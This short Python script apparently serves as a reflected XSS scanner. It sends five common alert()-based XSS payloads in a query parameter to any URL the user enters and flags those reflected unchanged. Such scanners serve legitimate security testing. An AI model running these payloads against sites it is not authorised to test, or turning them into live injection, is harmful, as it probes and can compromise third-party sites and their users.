import requests

def check_xss(url):
    # Common XSS payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>"
    ]

    for payload in payloads:
        # making the URL with the payload
        test_url = f"{url}?input={payload}"  
        print(f"Testing URL: {test_url}")

        try:
            # Sending request
            response = requests.get(test_url)
            # Checking if the payload is reflected in the response
            if payload in response.text:
                print(f"[!] Potential XSS vulnerability detected with payload: {payload}")
            else:
                print("[+] No vulnerability detected with this payload.")
        except requests.exceptions.RequestException as e:
            print(f"Error during request: {e}")

if __name__ == "__main__":
    target_url = input("Enter the target URL (including http/https): ")
    check_xss(target_url)
